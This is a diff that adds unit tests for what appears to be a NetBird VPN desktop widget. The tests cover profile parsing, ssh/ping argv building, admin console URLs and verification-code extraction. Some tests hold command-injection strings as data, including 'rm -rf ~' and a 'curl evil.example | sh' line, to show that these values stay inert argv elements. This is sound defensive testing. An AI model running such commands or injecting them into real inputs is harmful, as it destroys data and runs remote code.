@@ -1050,6 +1050,159 @@ test("relay details are parsed for the expandable relay list", () => {
   assert.deepEqual(Model.parseStatus('{"daemonStatus":"Connected","relays":{"details":"nope"}}', NOW).relays, [])
 })
 
+// --- profiles ---------------------------------------------------------------
+
+// Exactly the table `netbird profile list` prints on 0.77.1:
+//     NAME     ACTIVE
+//     default  ✓
+test("parseProfileList reads the table and marks the active profile", () => {
+  assert.deepEqual(Model.parseProfileList("NAME     ACTIVE\ndefault  ✓\n"), [{ name: "default", active: true }])
+  assert.deepEqual(Model.parseProfileList("NAME     ACTIVE\ndefault  ✓\nwork\npersonal\n"), [
+    { name: "default", active: true },
+    { name: "work", active: false },
+    { name: "personal", active: false }
+  ])
+  // Names with the punctuation a profile may legitimately carry.
+  assert.deepEqual(Model.parseProfileList("NAME     ACTIVE\nwork.acme\nuser@host  ✓\n").map((p) => p.name), ["work.acme", "user@host"])
+})
+
+// The failure this guards against: without requiring the header, a CLI that
+// printed a warning instead of the table would put that warning in the
+// switcher as a row that runs `netbird profile select <warning>` when clicked.
+test("parseProfileList refuses anything that is not the table", () => {
+  assert.deepEqual(Model.parseProfileList("WARNING failed to open log file\ndefault  ✓\n"), [])
+  assert.deepEqual(Model.parseProfileList("default  ✓\n"), [])
+  for (const raw of ["", "   ", null, undefined, "no profiles"]) {
+    assert.deepEqual(Model.parseProfileList(raw), [])
+  }
+  // Header present but rows that are not plausible names are skipped.
+  const noisy = "NAME     ACTIVE\ndefault  ✓\n  -- not a name --\n/etc/passwd\n"
+  assert.deepEqual(Model.parseProfileList(noisy).map((p) => p.name), ["default"])
+  // A leading warning above a real table still parses, since the header anchors it.
+  assert.deepEqual(Model.parseProfileList("WARNING x\nNAME     ACTIVE\ndefault  ✓\n").map((p) => p.name), ["default"])
+})
+
+test("profile commands are timeout-wrapped argv vectors", () => {
+  assert.deepEqual(Model.profileListCommand(), ["timeout", "-k", "2", "8", "netbird", "profile", "list"])
+  assert.deepEqual(Model.profileSelectCommand("work"), ["timeout", "-k", "2", "8", "netbird", "profile", "select", "work"])
+  // A hostile name stays one argv element rather than becoming shell syntax.
+  const nasty = "work; rm -rf ~"
+  assert.deepEqual(Model.profileSelectCommand(nasty).slice(-1), [nasty])
+  assert.equal(Model.profileSelectCommand(nasty).length, 8)
+})
+
+// --- peer actions -----------------------------------------------------------
+
+test("ssh and ping build argv vectors, never a shell string", () => {
+  assert.deepEqual(Model.sshCommand("100.64.0.9"), ["omarchy-launch-terminal", "ssh", "100.64.0.9"])
+  assert.deepEqual(Model.pingCommand("100.64.0.9"), ["omarchy-launch-terminal", "ping", "100.64.0.9"])
+
+  // The address comes from the daemon. Even a hostile one stays a single
+  // element: there is no shell to reinterpret it, and nothing is concatenated.
+  const hostile = "100.64.0.9; curl evil.example | sh"
+  for (const build of [Model.sshCommand, Model.pingCommand]) {
+    const argv = build(hostile)
+    assert.equal(argv.length, 3)
+    assert.equal(argv[2], hostile)
+    // No element is a shell, and none carries an operator outside the address.
+    assert.ok(!argv.slice(0, 2).some((a) => /[;&|$`]/.test(a)))
+    assert.ok(!argv.some((a) => a === "sh" || a === "bash" || a === "-c"))
+  }
+})
+
+// --- admin console ----------------------------------------------------------
+
+test("adminConsoleUrl derives from the management URL and yields to the setting", () => {
+  // The default port is the only one dropped: a dashboard on 8443 lives there.
+  assert.equal(Model.adminConsoleUrl("https://netbird.example:443", ""), "https://netbird.example")
+  assert.equal(Model.adminConsoleUrl("https://netbird.example:8443", ""), "https://netbird.example:8443")
+  assert.equal(Model.adminConsoleUrl("https://netbird.example", ""), "https://netbird.example")
+  assert.equal(Model.adminConsoleUrl("https://netbird.example:443/some/path", ""), "https://netbird.example")
+  // IPv6 literals keep their brackets, with and without the default port.
+  assert.equal(Model.adminConsoleUrl("https://[2001:db8::1]:443", ""), "https://[2001:db8::1]")
+  assert.equal(Model.adminConsoleUrl("https://[2001:db8::1]:8443", ""), "https://[2001:db8::1]:8443")
+  // The setting always wins — this is how NetBird Cloud is configured.
+  assert.equal(Model.adminConsoleUrl("https://netbird.example:443", "https://app.netbird.io"), "https://app.netbird.io")
+  assert.equal(Model.adminConsoleUrl("", "https://app.netbird.io"), "https://app.netbird.io")
+  assert.equal(Model.adminConsoleUrl("https://netbird.example:443", "   "), "https://netbird.example")
+  // Nothing to derive from and nothing set means no button.
+  assert.equal(Model.adminConsoleUrl("", ""), "")
+  assert.equal(Model.adminConsoleUrl(null, null), "")
+})
+
+// --- review fixes -----------------------------------------------------------
+
+// Only a poll whose stdout parses as a status document counts as recovery. This
+// pins the discriminator the service branches on: exit 0 with unusable output
+// must not read as "the daemon is back".
+test("recovery is decided by a parseable document, not by a clean exit", () => {
+  const usable = (raw) => {
+    const parsed = Model.parseStatus(raw, NOW)
+    return parsed.ok && !parsed.unavailable
+  }
+  assert.equal(usable('{"daemonStatus":"Connected"}'), true)
+  assert.equal(usable(fixture("connected")), true)
+  // Each of these arrives with exit 0 and must not clear an outage.
+  for (const raw of ["", "   ", "garbage", "{", '{"error":"permission denied"}', "<html>502</html>"]) {
+    assert.equal(usable(raw), false, `expected ${JSON.stringify(raw)} to be unusable`)
+  }
+  // And none of them is a daemon-down signature either, so the outage simply
+  // persists rather than flipping either way on noise.
+  assert.equal(Model.daemonProbe(0, "", "garbage").daemonDown, false)
+})
+
+// A read that begins while a write is in flight cannot be trusted on the way
+// out: it snapshots the pre-write selection and would otherwise match.
+test("network reads are ordered against completed writes", () => {
+  // Nothing running: a read may start.
+  assert.equal(Model.canStartNetworksRead(false, false), true)
+  // A write in flight, or a read already running: it may not.
+  assert.equal(Model.canStartNetworksRead(true, false), false)
+  assert.equal(Model.canStartNetworksRead(false, true), false)
+  assert.equal(Model.canStartNetworksRead(true, true), false)
+
+  // Captured at start, compared at exit: equal completions and no write in
+  // flight means the rows still describe the current selection.
+  assert.equal(Model.shouldApplyNetworksRead(3, 3, false), true)
+  // A write completed while this read was out: its rows are stale.
+  assert.equal(Model.shouldApplyNetworksRead(3, 4, false), false)
+  // A write started while this read was out: stale even though the counts
+  // still agree, which is exactly the interleaving that slipped through before.
+  assert.equal(Model.shouldApplyNetworksRead(3, 3, true), false)
+  assert.equal(Model.shouldApplyNetworksRead(0, 0, false), true)
+})
+
+test("a bare ID line inside warning text is not a network", () => {
+  // The reported case: an ID with no route and no Status must yield nothing.
+  assert.deepEqual(Model.parseNetworksList("WARNING\n  - ID: phantom id\nrandom"), [])
+  // ID plus a route but no Status: still incomplete.
+  assert.deepEqual(Model.parseNetworksList("  - ID: x\n    Network: 10.0.0.0/8\n"), [])
+  // ID plus Status but no route: incomplete.
+  assert.deepEqual(Model.parseNetworksList("  - ID: x\n    Status: Selected\n"), [])
+  // A Status value the printer never emits does not count.
+  assert.deepEqual(Model.parseNetworksList("  - ID: x\n    Network: 10.0.0.0/8\n    Status: Maybe\n"), [])
+  // The complete block still parses, and a phantom next to a real one drops.
+  const mixed = "WARNING\n  - ID: phantom\n\n  - ID: real\n    Network: 10.0.0.0/8\n    Status: Selected\n"
+  assert.deepEqual(Model.parseNetworksList(mixed).map((n) => n.id), ["real"])
+})
+
+test("the verification code survives a line break and rejects a digest", () => {
+  // The buffer joins the CLI's lines, so the sentence can straddle one.
+  assert.equal(Model.extractVerificationCode("Please enter the\ncode ABCD-EFGH to authenticate."), "ABCD-EFGH")
+  assert.equal(Model.extractVerificationCode("enter the code\nWXYZ1234\nto authenticate"), "WXYZ1234")
+  // A hash in the code position is not something a person is being asked to
+  // type, so it is not shown as one.
+  assert.equal(Model.extractVerificationCode("enter the code deadbeefdeadbeefdeadbeefdeadbeef to authenticate"), "")
+  assert.equal(Model.extractVerificationCode("enter the code 0123456789abcdef0123456789abcdef to authenticate"), "")
+  // An all-letter run with no separator is prose, not a code.
+  assert.equal(Model.extractVerificationCode("enter the code somethingelse to authenticate"), "")
+  // Absurdly long is rejected outright.
+  assert.equal(Model.extractVerificationCode("enter the code " + "A1-".repeat(40) + " to authenticate"), "")
+  // The real shapes still work.
+  assert.equal(Model.extractVerificationCode("and enter the code ABCD-EFGH to authenticate."), "ABCD-EFGH")
+  assert.equal(Model.extractVerificationCode("enter the code K7P2QM9 to authenticate"), "K7P2QM9")
+})
+
 test("commands are the exact argv vectors the service runs", () => {
   // Every daemon call is timeout-wrapped: with the socket gone the CLI retries
   // forever rather than exiting, so without this a poll simply never returns.
